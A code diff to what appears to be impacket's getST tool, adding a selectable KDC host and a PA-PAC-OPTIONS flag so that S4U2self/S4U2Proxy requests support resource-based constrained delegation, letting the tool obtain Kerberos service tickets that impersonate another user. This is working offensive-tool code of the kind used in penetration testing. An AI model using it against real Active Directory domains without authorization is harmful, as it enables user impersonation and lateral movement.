@@ -49,7 +49,7 @@ from impacket import version
 from impacket.examples import logger
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
-    Ticket as TicketAsn1, EncTGSRepPart
+    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS
 from impacket.krb5.ccache import CCache
 from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5
 from impacket.krb5.kerberosv5 import getKerberosTGS
@@ -79,7 +79,7 @@ class GETST:
         ccache.fromTGS(ticket, sessionKey, sessionKey)
         ccache.saveFile(self.__saveFileName + '.ccache')
 
-    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey):
+    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, kdcHost):
         decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]
 
         # Extract the ticket from the TGT
@@ -204,7 +204,7 @@ class GETST:
         logging.info('\tRequesting S4U2self')
         message = encoder.encode(tgsReq)
 
-        r = sendReceive(message, self.__domain, None)
+        r = sendReceive(message, self.__domain, kdcHost)
 
         tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]
 
@@ -266,6 +266,14 @@ class GETST:
         tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
         tgsReq['padata'][0]['padata-value'] = encodedApReq
 
+        # Add resource-based constrained delegation support
+        paPacOptions = PA_PAC_OPTIONS()
+        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))
+
+        tgsReq['padata'][1] = noValue
+        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
+        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)
+
         reqBody = seq_set(tgsReq, 'req-body')
 
         opts = list()
@@ -298,7 +306,7 @@ class GETST:
         message = encoder.encode(tgsReq)
 
         logging.info('\tRequesting S4U2Proxy')
-        r = sendReceive(message, self.__domain, None)
+        r = sendReceive(message, self.__domain, kdcHost)
 
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
@@ -359,7 +367,7 @@ class GETST:
             # Here's the rock'n'roll
             try:
                 logging.info('Impersonating %s' % self.__options.impersonate)
-                tgs, copher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey)
+                tgs, copher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, self.__kdcHost)
             except Exception as e:
                 logging.error(str(e))
                 if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:
